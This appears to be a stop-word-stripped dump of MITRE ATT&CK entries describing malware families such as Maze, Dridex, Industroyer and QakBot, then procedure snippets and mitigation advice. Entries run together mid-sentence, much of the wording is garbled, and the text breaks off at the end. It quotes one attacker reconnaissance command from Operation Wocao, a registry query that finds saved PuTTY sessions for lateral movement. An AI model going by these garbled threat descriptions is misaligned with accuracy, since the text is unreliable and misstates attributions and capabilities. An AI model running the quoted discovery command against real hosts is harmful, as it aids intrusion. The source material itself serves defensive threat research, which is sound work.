Report June 2021) [Meteor](https://attack.mitre.org/software/S0688) wiper Iranian government organizations, including Iranian Railways, Ministry Roads, Urban Development systems, July 2021. [Meteor](https://attack.mitre.org/software/S0688) version wipers called Stardust Comet reportedly called "Indra" 2019 private companies Syria.(Citation: Check Meteor Aug 2021) [njRAT](https://attack.mitre.org/software/S0385) remote access tool (RAT) observed 2012. threat actors Middle East.(Citation: Fidelis njRAT June 2013) [Maze](https://attack.mitre.org/software/S0449) ransomware, "ChaCha", discovered 2019. addition encrypting files victim machines impact, [Maze](https://attack.mitre.org/software/S0449) operators conduct stealing campaigns prior encryption post online extort companies.(Citation: FireEye Maze 2020)(Citation: McAfee Maze March 2020)(Citation: Sophos Maze VM September 2020) [BOOTRASH](https://attack.mitre.org/software/S0114) [Bootkit](https://attack.mitre.org/techniques/T1542/003) targets Windows operating systems. threat actors target financial sector.(Citation: Mandiant Trends 2016)(Citation: FireEye Bootkits)(Citation: FireEye BOOTRASH SANS) [ComRAT](https://attack.mitre.org/software/S0126) stage implant suspected descendant [Agent.btz](https://attack.mitre.org/software/S0092) [Turla](https://attack.mitre.org/groups/G0010). version [ComRAT](https://attack.mitre.org/software/S0126) identified 2007, tool undergone substantial development since.(Citation: Symantec Waterbug)(Citation: NorthSec 2015 GData Uroburos Tools)(Citation: ESET ComRAT 2020) [TURNEDUP](https://attack.mitre.org/software/S0199) non-public backdoor. dropped [APT33](https://attack.mitre.org/groups/G0064)'s [StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017) [ChChes](https://attack.mitre.org/software/S0144) Trojan appears exclusively [menuPass](https://attack.mitre.org/groups/G0045). target Japanese organizations 2016. lack persistence methods suggests intended first-stage tool. (Citation: Palo Alto menuPass Feb 2017) (Citation: JPCERT ChChes Feb 2017) (Citation: PWC Cloud Hopper Technical Annex April 2017) [PowerStallion](https://attack.mitre.org/software/S0393) lightweight [PowerShell](https://attack.mitre.org/techniques/T1059/001) backdoor [Turla](https://attack.mitre.org/groups/G0010), recovery access tool install backdoors.(Citation: ESET Turla PowerShell 2019) [IceApple](https://attack.mitre.org/software/S1022) modular Internet Services (IIS) post-exploitation framework, 2021 technology, academic, government sectors.(Citation: CrowdStrike IceApple 2022) [JPIN](https://attack.mitre.org/software/S0201) custom-built backdoor family [PLATINUM](https://attack.mitre.org/groups/G0068). Evidence suggests developers [JPIN](https://attack.mitre.org/software/S0201) [Dipsind](https://attack.mitre.org/software/S0200) code bases way. (Citation: PLATINUM April 2016) [SideTwist](https://attack.mitre.org/software/S0610) C-based backdoor [OilRig](https://attack.mitre.org/groups/G0049) 2021.(Citation: Check APT34 April 2021) [KOCTOPUS](https://attack.mitre.org/software/S0669)'s batch variant loader [LazyScripter](https://attack.mitre.org/groups/G0140) 2018 launch [Octopus](https://attack.mitre.org/software/S0340) [Koadic](https://attack.mitre.org/software/S0250) and, cases, [QuasarRAT](https://attack.mitre.org/software/S0262). [KOCTOPUS](https://attack.mitre.org/software/S0669) VBA variant functionality batch version.(Citation: MalwareBytes LazyScripter Feb 2021) [MechaFlounder](https://attack.mitre.org/software/S0459) python-based remote access tool (RAT) [APT39](https://attack.mitre.org/groups/G0087). payload combination actor developed code code snippets freely online development communities.(Citation: Unit 42 MechaFlounder March 2019) [Psylo](https://attack.mitre.org/software/S0078) shellcode-based Trojan [Scarlet Mimic](https://attack.mitre.org/groups/G0029). characteristics [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) custom backdoor--based Heyoka source exfiltration tool--that  [Aoqin Dragon](https://attack.mitre.org/groups/G1007) 2013.(Citation: SentinelOne Aoqin Dragon June 2022)(Citation: Sourceforge Heyoka 2022)  [HTTPBrowser](https://attack.mitre.org/software/S0070) malware threat groups. (Citation: ThreatStream Evasion Analysis) (Citation: Dell TG-3390) believed Chinese origin. (Citation: ThreatConnect Anthem) [Mis-Type](https://attack.mitre.org/software/S0084) backdoor hybrid [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) 2012.(Citation: Cylance Dust Storm) [XCSSET](https://attack.mitre.org/software/S0658) macOS modular backdoor targets Xcode application developers. [XCSSET](https://attack.mitre.org/software/S0658) observed August 2020 install backdoor component, modify browser applications, conduct collection, provide ransomware-like encryption capabilities.(Citation: trendmicro xcsset xcode project 2020) [Dipsind](https://attack.mitre.org/software/S0200) malware family backdoors exclusively [PLATINUM](https://attack.mitre.org/groups/G0068). (Citation: PLATINUM April 2016) [Octopus](https://attack.mitre.org/software/S0340) Windows Trojan written Delphi programming language [Nomadic Octopus](https://attack.mitre.org/groups/G0133) target government organizations Central Asia 2014.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018)  [KillDisk](https://attack.mitre.org/software/S0607) disk-wiping tool designed overwrite files random data render OS unbootable. observed component [BlackEnergy](https://attack.mitre.org/software/S0089) malware cyber attacks Ukraine 2015. [KillDisk](https://attack.mitre.org/software/S0607) evolved stand-alone malware variety threat actors additional targets Europe Latin America; 2016 ransomware component incorporated [KillDisk](https://attack.mitre.org/software/S0607) variants.(Citation: KillDisk Ransomware)(Citation: ESEST Black Energy Jan 2016)(Citation: Trend Micro KillDisk 1)(Citation: Trend Micro KillDisk 2) [AppleJeus](https://attack.mitre.org/software/S0584) family downloaders initially discovered 2018 embedded trojanized cryptocurrency applications. [AppleJeus](https://attack.mitre.org/software/S0584) [Lazarus Group](https://attack.mitre.org/groups/G0032), targeting companies energy, finance, government, industry, technology, telecommunications sectors, countries including United States, United Kingdom, South Korea, Australia, Brazil, Zealand, Russia. [AppleJeus](https://attack.mitre.org/software/S0584) distribute [FALLCHILL](https://attack.mitre.org/software/S0181) RAT.(Citation: CISA AppleJeus Feb 2021) [SoreFang](https://attack.mitre.org/software/S0516) stage downloader [APT29](https://attack.mitre.org/groups/G0016) exfiltration load malware.(Citation: NCSC APT29 July 2020)(Citation: CISA SoreFang July 2016) [STARWHALE](https://attack.mitre.org/software/S1037) Windows Script File (WSF) backdoor [MuddyWater](https://attack.mitre.org/groups/G0069), November 2021; [STARWHALE](https://attack.mitre.org/software/S1037) variant written Golang capabilities. Security researchers [STARWHALE](https://attack.mitre.org/software/S1037) UNC3313, [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022)(Citation: DHS CISA AA22-055A MuddyWater February 2022) [MirageFox](https://attack.mitre.org/software/S0280) remote access tool Windows systems. appears upgraded version tool Mirage, RAT believed originate 2012. (Citation: APT15 Intezer June 2018) [Industroyer](https://attack.mitre.org/software/S0604) sophisticated malware framework designed impact processes Industrial Control Systems (ICS), components electrical substations.(Citation: ESET Industroyer) [Industroyer](https://attack.mitre.org/software/S0604) attacks Ukrainian power grid December 2016.(Citation: Dragos Crashoverride 2017) publicly malware designed target impact operations electric grid.(Citation: Dragos Crashoverride 2018) [DownPaper](https://attack.mitre.org/software/S0186) backdoor Trojan; main functionality download stage malware. (Citation: ClearSky Charming Kitten Dec 2017) [Socksbot](https://attack.mitre.org/software/S0273) backdoor  abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017) [HIDEDRV](https://attack.mitre.org/software/S0135) rootkit [APT28](https://attack.mitre.org/groups/G0007). deployed [Downdelph](https://attack.mitre.org/software/S0134) execute hide malware. (Citation: ESET Sednit 3) (Citation: Sekoia HideDRV Oct 2016) [CozyCar](https://attack.mitre.org/software/S0046) malware [APT29](https://attack.mitre.org/groups/G0016) 2010 2015. modular malware platform, backdoor component instructed download execute variety modules functionality. (Citation: F-Secure Dukes) [Kevin](https://attack.mitre.org/software/S1020) backdoor implant written C++ [HEXANE](https://attack.mitre.org/groups/G1001) June 2020, including operations organizations Tunisia.(Citation: Kaspersky Lyceum October 2021) [Agent Tesla](https://attack.mitre.org/software/S0331) spyware Trojan written .NET framework observed 2014.(Citation: Fortinet Agent Tesla April 2018)(Citation: Bitdefender Agent Tesla April 2020)(Citation: Malwarebytes Agent Tesla April 2020) [Pasam](https://attack.mitre.org/software/S0208) trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Pasam 2012) [httpclient](https://attack.mitre.org/software/S0068) malware [Putter Panda](https://attack.mitre.org/groups/G0024). simple tool limited range functionality, suggesting second-stage supplementary/backup tool. (Citation: CrowdStrike Putter Panda) [POWERSTATS](https://attack.mitre.org/software/S0223) PowerShell-based stage backdoor [MuddyWater](https://attack.mitre.org/groups/G0069). (Citation: Unit 42 MuddyWater Nov 2017) [POWERTON](https://attack.mitre.org/software/S0371) custom PowerShell backdoor observed 2018. typically deployed late-stage backdoor [APT33](https://attack.mitre.org/groups/G0064). variants backdoor identified, version improved functionality.(Citation: FireEye APT33 Guardrail) [ECCENTRICBANDWAGON](https://attack.mitre.org/software/S0593) remote access Trojan (RAT) North Korean cyber actors identified August 2020. reconnaissance tool--with keylogging screen capture functionality--used gathering compromised systems.(Citation: CISA EB Aug 2020) [BADNEWS](https://attack.mitre.org/software/S0128) malware actors responsible [Patchwork](https://attack.mitre.org/groups/G0040) campaign. RSS feeds, forums, blogs command control. (Citation: Forcepoint Monsoon) (Citation: TrendMicro Patchwork Dec 2017) [Linfo](https://attack.mitre.org/software/S0211) rootkit trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Linfo 2012) [Goopy](https://attack.mitre.org/software/S0477) Windows backdoor Trojan [APT32](https://attack.mitre.org/groups/G0050) shares similarities backdoor ([Denis](https://attack.mitre.org/software/S0354)). [Goopy](https://attack.mitre.org/software/S0477) named impersonation legitimate Google Updater executable.(Citation: Cybereason Cobalt Kitty 2017) [ShadowPad](https://attack.mitre.org/software/S0596) modular backdoor identified supply chain compromise NetSarang software mid-July 2017. malware originally exclusively [APT41](https://attack.mitre.org/groups/G0096), observed Chinese threat activity groups. (Citation: Recorded Future RedEcho Feb 2021)(Citation: Securelist ShadowPad Aug 2017)(Citation: Kaspersky ShadowPad Aug 2017)  [Remexi](https://attack.mitre.org/software/S0375) Windows-based Trojan developed programming language.(Citation: Securelist Remexi Jan 2019) [Astaroth](https://attack.mitre.org/software/S0373) Trojan stealer affect companies Europe, Brazil, Latin America. publicly late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020) [QakBot](https://attack.mitre.org/software/S0650) modular banking trojan financially-motivated actors 2007. [QakBot](https://attack.mitre.org/software/S0650) continuously maintained developed evolved stealer delivery agent ransomware, notably [ProLock](https://attack.mitre.org/software/S0654) [Egregor](https://attack.mitre.org/software/S0554).(Citation: Trend Micro Qakbot December 2020)(Citation: Red Canary Qbot)(Citation: Kaspersky QakBot September 2021)(Citation: ATT QakBot April 2021) [SYSCON](https://attack.mitre.org/software/S0464) backdoor 2017 campaigns involving North Korean themes. [SYSCON](https://attack.mitre.org/software/S0464) delivered [CARROTBALL](https://attack.mitre.org/software/S0465) [CARROTBAT](https://attack.mitre.org/software/S0462) droppers.(Citation: Unit 42 CARROTBAT November 2018)(Citation: Unit 42 CARROTBAT January 2020) [CookieMiner](https://attack.mitre.org/software/S0492) mac-based malware targets cryptocurrency exchanges enabling cryptocurrency mining victim itself. discovered wild 2019.(Citation: Unit42 CookieMiner Jan 2019) [Hancitor](https://attack.mitre.org/software/S0499) downloader [Pony](https://attack.mitre.org/software/S0453) stealing malware.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor) [Gelsemium](https://attack.mitre.org/software/S0666) modular malware comprised dropper (Gelsemine), loader (Gelsenicine), main (Gelsevirine) plug-ins written Foundation Class (MFC) framework. [Gelsemium](https://attack.mitre.org/software/S0666) Gelsemium 2014.(Citation: ESET Gelsemium June 2021) [jRAT](https://attack.mitre.org/software/S0283) cross-platform, Java-based backdoor originally purchase 2012. Variants [jRAT](https://attack.mitre.org/software/S0283) distributed software-as-a-service platform, online subscription model.(Citation: Kaspersky Adwind Feb 2016) (Citation: jRAT Symantec Aug 2018) [Helminth](https://attack.mitre.org/software/S0170) backdoor variants - written VBScript PowerShell delivered macros Excel spreadsheets, standalone Windows executable. (Citation: Palo Alto OilRig 2016) [Dridex](https://attack.mitre.org/software/S0384) prolific banking Trojan appeared 2014. December 2019, Treasury estimated [Dridex](https://attack.mitre.org/software/S0384) infected computers hundreds banks financial institutions 40 countries, leading $100 theft. [Dridex](https://attack.mitre.org/software/S0384) created source code Bugat banking Trojan (also Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex 2017)(Citation: Treasury EvilCorp Dec 2019) [BBK](https://attack.mitre.org/software/S0470) downloader [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) 2019.(Citation: Trend Micro Tick November 2019) [Komplex](https://attack.mitre.org/software/S0162) backdoor [APT28](https://attack.mitre.org/groups/G0007) OS appears developed manner [XAgentOSX](https://attack.mitre.org/software/S0161) (Citation: XAgentOSX 2017) (Citation: Sofacy Komplex Trojan). [OSX/Shlayer](https://attack.mitre.org/software/S0402) Trojan designed install adware macOS discovered 2018.(Citation: Carbon Black Shlayer Feb 2019)(Citation: Intego Shlayer Feb 2018) [Denis](https://attack.mitre.org/software/S0354) Windows backdoor Trojan [APT32](https://attack.mitre.org/groups/G0050). [Denis](https://attack.mitre.org/software/S0354) shares similarities [SOUNDBITE](https://attack.mitre.org/software/S0157) backdoor conjunction [Goopy](https://attack.mitre.org/software/S0477) backdoor.(Citation: Cybereason Oceanlotus 2017) [GLOOXMAIL](https://attack.mitre.org/software/S0026) malware [APT1](https://attack.mitre.org/groups/G0006) mimics legitimate Jabber/XMPP traffic. (Citation: Mandiant APT1) [Dok](https://attack.mitre.org/software/S0281) Trojan application disguised .zip file collect user credentials install malicious proxy server redirect user's network traffic [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)).(Citation: objsee mac malware 2017)(Citation: hexed osx.dok analysis 2019)(Citation: CheckPoint Dok) [Waterbear](https://attack.mitre.org/software/S0579) modular malware attributed [BlackTech](https://attack.mitre.org/groups/G0098) lateral movement, decrypting, triggering payloads capable hiding network behaviors.(Citation: Trend Micro Waterbear December 2019) [FIVEHANDS](https://attack.mitre.org/software/S0618) customized version [DEATHRANSOM](https://attack.mitre.org/software/S0616) ransomware written C++. [FIVEHANDS](https://attack.mitre.org/software/S0618) 2021, including Ransomware-as-a-Service (RaaS) campaigns, [SombRAT](https://attack.mitre.org/software/S0615).(Citation: FireEye FiveHands April 2021)(Citation: NCC Fivehands June 2021) [Comnie](https://attack.mitre.org/software/S0244) remote backdoor attacks East Asia. (Citation: Palo Alto Comnie) [Vasport](https://attack.mitre.org/software/S0207) trojan [Elderwood](https://attack.mitre.org/groups/G0066) backdoor compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport 2012) [AutoIt backdoor](https://attack.mitre.org/software/S0129) malware actors responsible MONSOON campaign. actors frequently weaponized .pps files exploiting CVE-2014-6352. (Citation: Forcepoint Monsoon) malware legitimate scripting language Windows GUI automation name. [JSS Loader](https://attack.mitre.org/software/S0648) Remote Access Trojan (RAT) .NET C++ variants [FIN7](https://attack.mitre.org/groups/G0046) 2020.(Citation: eSentire FIN7 July 2021)(Citation: CrowdStrike Carbon Spider August 2021) [PHOREAL](https://attack.mitre.org/software/S0158) signature backdoor [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 2017) [OSInfo](https://attack.mitre.org/software/S0165) custom tool [APT3](https://attack.mitre.org/groups/G0022) internal discovery victim's network. (Citation: Symantec Buckeye) [MacSpy](https://attack.mitre.org/software/S0282) malware-as-a-service offered darkweb  (Citation: objsee mac malware 2017). [Lizar](https://attack.mitre.org/software/S0681) modular remote access tool written .NET Framework shares structural similarities [Carbanak](https://attack.mitre.org/software/S0030). [FIN7](https://attack.mitre.org/groups/G0046) February 2021.(Citation: BiZone Lizar 2021)(Citation: Threatpost Lizar 2021)(Citation: Gemini FIN7 Oct 2021) [Dtrack](https://attack.mitre.org/software/S0567) spyware discovered 2019 Indian financial institutions, facilities, Kudankulam Nuclear Power Plant. [Dtrack](https://attack.mitre.org/software/S0567) shares similarities DarkSeoul campaign, attributed [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: Kaspersky Dtrack)(Citation: Securelist Dtrack)(Citation: Dragos WASSONITE)(Citation: CyberBit Dtrack)(Citation: ZDNet Dtrack) [H1N1](https://attack.mitre.org/software/S0132) malware variant distributed campaign VBA macros infect victims. initially loader capabilities, evolved include information-stealing functionality. (Citation: Cisco H1N1 1) [Seth-Locker](https://attack.mitre.org/software/S0639) ransomware remote control capabilities 2021.
(Citation: Trend Micro Ransomware February 2021) [LoudMiner](https://attack.mitre.org/software/S0451) cryptocurrency miner virtualization software siphon resources. miner bundled pirated copies Virtual Studio Technology (VST) Windows macOS.(Citation: ESET LoudMiner June 2019) [Azorult](https://attack.mitre.org/software/S0344) commercial Trojan steal compromised hosts. [Azorult](https://attack.mitre.org/software/S0344) observed wild 2016.
In July 2018, [Azorult](https://attack.mitre.org/software/S0344) spearphishing campaign targets North America. [Azorult](https://attack.mitre.org/software/S0344) cryptocurrency theft. (Citation: Unit42 Azorult Nov 2018)(Citation: Proofpoint Azorult July 2018) [BitPaymer](https://attack.mitre.org/software/S0570) ransomware variant observed August 2017 targeting hospitals U.K. [BitPaymer](https://attack.mitre.org/software/S0570) unique encryption key, ransom note, contact operation. [BitPaymer](https://attack.mitre.org/software/S0570) indicators suggesting overlap [Dridex](https://attack.mitre.org/software/S0384) malware delivered [Dridex](https://attack.mitre.org/software/S0384).(Citation: Crowdstrike Indrik November 2018) [BACKSPACE](https://attack.mitre.org/software/S0031) backdoor [APT30](https://attack.mitre.org/groups/G0013) dates 2005. (Citation: FireEye APT30) [Zox](https://attack.mitre.org/software/S0672) remote access tool [Axiom](https://attack.mitre.org/groups/G0001) 2008.(Citation: Novetta-Axiom) [UPPERCUT](https://attack.mitre.org/software/S0275) backdoor [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) spying backdoor [APT28](https://attack.mitre.org/groups/G0007) 2012 2016. long-term espionage deployed targets deemed reconnaissance phase. (Citation: Kaspersky Sofacy) (Citation: ESET Sednit 2) [StrifeWater](https://attack.mitre.org/software/S1034) remote-access tool [Moses Staff](https://attack.mitre.org/groups/G1009) initial stages attacks November 2021.(Citation: Cybereason StrifeWater Feb 2022) [Mivast](https://attack.mitre.org/software/S0080) backdoor [Deep Panda](https://attack.mitre.org/groups/G0009). reportedly Anthem breach. (Citation: Symantec Black Vine) [HiddenWasp](https://attack.mitre.org/software/S0394) Linux-based Trojan target systems remote control. form statically linked ELF binary stdlibc++.(Citation: Intezer HiddenWasp Map 2019) [WarzoneRAT](https://attack.mitre.org/software/S0670) malware-as-a-service remote access tool (RAT) written C++ publicly purchase late 2018.(Citation: Check Warzone Feb 2020)(Citation: Uptycs Warzone UAC Bypass November 2020) [Net Crawler](https://attack.mitre.org/software/S0056) intranet worm capable extracting credentials credential dumpers spreading systems network SMB brute forcing accounts recovered passwords [PsExec](https://attack.mitre.org/software/S0029) execute [Net Crawler](https://attack.mitre.org/software/S0056). (Citation: Cylance Cleaver) [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) remote access Trojan written C++ unidentified "sophisticated cyber actor" January 2017.(Citation: CISA MAR SLOTHFULMEDIA October 2020)(Citation: Costin Raiu IAmTheKing October 2020) target government organizations, defense contractors, universities, energy companies Russia, India, Kazakhstan, Kyrgyzstan, Malaysia, Ukraine, Eastern Europe.(Citation: USCYBERCOM SLOTHFULMEDIA October 2020)(Citation: Kaspersky IAmTheKing October 2020)  

In October 2020, Kaspersky Labs assessed [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) activity cluster refers "IAmTheKing".(Citation: Kaspersky IAmTheKing October 2020) ESET code similarity [SLOTHFULMEDIA](https://attack.mitre.org/software/S0533) droppers refers "PowerPool".(Citation: ESET PowerPool Code October 2020)  [FALLCHILL](https://attack.mitre.org/software/S0181) RAT [Lazarus Group](https://attack.mitre.org/groups/G0032) 2016 target aerospace, telecommunications, finance industries. dropped [Lazarus Group](https://attack.mitre.org/groups/G0032) malware delivered victim unknowingly visits compromised website. (Citation: US-CERT FALLCHILL Nov 2017) [Small Sieve](https://attack.mitre.org/software/S1035) Telegram Bot API-based Python backdoor distributed Nullsoft Scriptable Install (NSIS) Installer; [MuddyWater](https://attack.mitre.org/groups/G0069) January 2022.(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: NCSC GCHQ Sieve Jan 2022)

Security researchers [Small Sieve](https://attack.mitre.org/software/S1035)'s UNC3313, [MuddyWater](https://attack.mitre.org/groups/G0069).(Citation: Mandiant UNC3313 Feb 2022) [Flame](https://attack.mitre.org/software/S0143) sophisticated toolkit collect 2010, targeting Middle East countries. (Citation: Kaspersky Flame) [HermeticWizard](https://attack.mitre.org/software/S0698) worm spread [HermeticWiper](https://attack.mitre.org/software/S0697) attacks organizations Ukraine 2022.(Citation: ESET Hermetic Wizard March 2022)  [Explosive](https://attack.mitre.org/software/S0569) collected MAC address victim's machine.(Citation: CheckPoint Volatile Cedar March 2015)  Monitor network data uncommon data flows. Processes utilizing network network communication suspicious. [Indrik Spider](https://attack.mitre.org/groups/G0119) [Cobalt Strike](https://attack.mitre.org/software/S0154) carry credential dumping ProcDump.(Citation: Symantec WastedLocker June 2020) [SombRAT](https://attack.mitre.org/software/S0615) SSL encrypt C2 traffic.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021)(Citation: CISA AR21-126A FIVEHANDS 2021) [GoldFinder](https://attack.mitre.org/software/S0597) performed requests check internet connectivity identify proxy servers redirectors request traveled through.(Citation: MSTIC NOBELIUM Mar 2021) Periodically baseline instances identify malicious modifications additions. [Cobalt Strike](https://attack.mitre.org/software/S0154) ability accept Host Header enable domain fronting.(Citation: Cobalt Strike Manual 4.3 November 2020) [Shamoon](https://attack.mitre.org/software/S0140) obtains time activate preset date.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018) [Micropsia](https://attack.mitre.org/software/S0339) gathers hostname OS version victim’s machine.(Citation: Talos Micropsia June 2017)(Citation: Radware Micropsia July 2018) [Operation Wocao](https://attack.mitre.org/campaigns/C0014), threat actors executed `/c /d c:\windows\temp\ & reg query HKEY_CURRENT_USER\Software\<username>\PuTTY\Sessions\` detect PuTTY sessions, lateral movement.(Citation: FoxIT Wocao December 2019) (Citation: Symantec Elderwood Sept 2012) [RogueRobin](https://attack.mitre.org/software/S0270) establishes persistence creating shortcut (.LNK file) Windows startup folder script time user logs in.(Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019) Variants [Emissary](https://attack.mitre.org/software/S0082) Registry establish persistence.(Citation: Emissary Trojan Feb 2016) [Ursnif](https://attack.mitre.org/software/S0386) gathered running services.(Citation: TrendMicro Ursnif Mar 2015) [Mori](https://attack.mitre.org/software/S1047) communicate IPv4 IPv6 depending flag set.(Citation: DHS CISA AA22-055A MuddyWater February 2022) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. Efforts focus minimizing sensitivity data external parties. [FIN7](https://attack.mitre.org/groups/G0046) malicious links lure victims downloading malware.(Citation: CrowdStrike Carbon Spider August 2021) Mitigation variants technique achieved stateful firewalls, depending implemented. anti-spoofing email authentication mechanisms filter messages based validity checks sender domain (using SPF) integrity messages (using DKIM). Enabling mechanisms organization (through policies DMARC) enable recipients (intra-org cross domain) perform message filtering validation.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing).

Furthermore, policies enforce / install browser extensions protect IDN homograph attacks. [GoldMax](https://attack.mitre.org/software/S0588) scheduled tasks maintain persistence.(Citation: MSTIC NOBELIUM Mar 2021) [njRAT](https://attack.mitre.org/software/S0385) enumerates victim operating initial infection.(Citation: Fidelis njRAT June 2013) [TDTESS](https://attack.mitre.org/software/S0164) creates deletes log files installation service.(Citation: ClearSky Wilted Tulip July 2017) [WIRTE](https://attack.mitre.org/groups/G0090) PowerShell script execution.(Citation: Lab52 WIRTE Apr 2019) Monitor abnormal process trees typical processes services execution commands relate Discovery adversary techniques.  [Maze](https://attack.mitre.org/software/S0449) disrupted systems encrypting files targeted machines, claiming decrypt files ransom payment made. [Maze](https://attack.mitre.org/software/S0449) ChaCha algorithm, based Salsa20, RSA algorithm encrypt files.(Citation: FireEye Maze 2020) initial installation, [Raindrop](https://attack.mitre.org/software/S0565) runs computation delay execution.(Citation: Symantec RAINDROP January 2021) [WIRTE](https://attack.mitre.org/groups/G0090) HTTPS ports 2083 2087 C2.(Citation: Kaspersky WIRTE November 2021) [Lokibot](https://attack.mitre.org/software/S0447) VBS scripts XLS macros execution.(Citation: Talos Lokibot Jan 2021)  [Conti](https://attack.mitre.org/software/S0575) spread SMB encrypts files hosts, compromising entire network.(Citation: Cybereason Conti Jan 2021)(Citation: CarbonBlack Conti July 2020) [FunnyDream](https://attack.mitre.org/campaigns/C0007), [ccf32](https://attack.mitre.org/software/S1043) collect data.(Citation: Bitdefender FunnyDream Campaign November 2020) [BLACKCOFFEE](https://attack.mitre.org/software/S0069) capability enumerate files.(Citation: FireEye APT17) [Pupy](https://attack.mitre.org/software/S0192) [PsExec](https://attack.mitre.org/software/S0029) execute payload commands remote host.(Citation: GitHub Pupy) [Dragonfly](https://attack.mitre.org/groups/G0035) compressed data .zip files prior exfiltration.(Citation: US-CERT TA18-074A) <code>HISTCONTROL</code> environment variable set “ignoredups” “ignoreboth” “ignorespace”. [Astaroth](https://attack.mitre.org/software/S0373) store C2 cloud hosting services AWS CloudFlare websites YouTube Facebook.(Citation: Securelist Brazilian Banking Malware July 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) <code>sudo</code> command.(Citation: Cobalt Strike Manual 4.3 November 2020) Monitor attempts access SYSVOL involve searching XML files. [Wizard Spider](https://attack.mitre.org/groups/G0102) code signing certificate signed Digicert malware.(Citation: DFIR Ryuk 2 Hour Speed November 2020) Adversaries replace accessibility features binaries alternate binaries execute technique. Identify block malicious software executed accessibility features functionality application whitelisting (Citation: Beechey 2010) tools, Windows Defender Application Control(Citation: Windows Defender Application Control), AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA AppLocker) Software Restriction Policies (Citation: Corio 2008) appropriate. (Citation: TechNet Applocker SRP) [Goopy](https://attack.mitre.org/software/S0477) ability communicate C2 DNS.(Citation: Cybereason Cobalt Kitty 2017)	 removable media device inserted victim, [USBStealer](https://attack.mitre.org/software/S0136) collects data exfiltrated victim.(Citation: ESET Sednit USBStealer 2014)(Citation: Kaspersky Sofacy) [Flame](https://attack.mitre.org/software/S0143) modules infect USB sticks spread laterally Windows systems stick plugged Autorun functionality.(Citation: Kaspersky Flame) Configure Increase Scheduling Priority option Administrators rights schedule priority process. configured GPO: Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority) [Mis-Type](https://attack.mitre.org/software/S0084) network traffic communicate raw socket.(Citation: Cylance Dust Storm) [EvilBunny](https://attack.mitre.org/software/S0396) API calls checks malware running sandbox.(Citation: Cyphort EvilBunny Dec 2014)	 Limit permissions discover cloud infrastructure privilege. Organizations limit users organization IAM role administrative privileges, strive reduce permanent privileged role assignments, conduct periodic entitlement reviews IAM users, roles policies. Monitor newly executed processes set files directories hidden evade detection mechanisms. (Citation: OilRig Delivery Oct 2017) [Equation](https://attack.mitre.org/groups/G0020) encrypted virtual file stored Windows Registry.(Citation: Kaspersky Equation QA) [Trojan.Karagany](https://attack.mitre.org/software/S0094) gather user compromised host.(Citation: Secureworks Karagany July 2019) [UPPERCUT](https://attack.mitre.org/software/S0275) C2, including sending error codes Cookie headers.(Citation: FireEye APT10 Sept 2018) [Azorult](https://attack.mitre.org/software/S0344) WTSQueryUserToken CreateProcessAsUser start process local privileges.(Citation: Unit42 Azorult Nov 2018) [Fox Kitten](https://attack.mitre.org/groups/G0117) downloaded additional tools including [PsExec](https://attack.mitre.org/software/S0029) endpoints.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [PoetRAT](https://attack.mitre.org/software/S0428) username, name, generated UUID reply "who" command C2.(Citation: Talos PoetRAT April 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) signed Java applets execute signed applet attacks.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) (Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) [DarkWatchman](https://attack.mitre.org/software/S0673) identity OS locale compromised host.(Citation: Prevailion DarkWatchman 2021) [Torisma](https://attack.mitre.org/software/S0678) Base64 encoded AES encrypted.(Citation: McAfee Lazarus Nov 2020) [RDAT](https://attack.mitre.org/software/S0495) communications C2, WinHTTP library requests Exchange Services API.(Citation: Unit42 RDAT July 2020) Refer NIST guidelines creating password policies. (Citation: NIST 800-63-3) difficult technique detect adversary traffic masked normal user traffic. Monitor [Process Injection](https://attack.mitre.org/techniques/T1055) browser applications. [Fox Kitten](https://attack.mitre.org/groups/G0117) Perl reverse communicate C2.(Citation: ClearSky Pay2Kitten December 2020) (Citation: Kaspersky WIRTE November 2021) [EvilBunny](https://attack.mitre.org/software/S0396) downloaded additional Lua scripts C2.(Citation: Cyphort EvilBunny Dec 2014) [Aquatic Panda](https://attack.mitre.org/groups/G0143) encoded commands Base64.(Citation: CrowdStrike 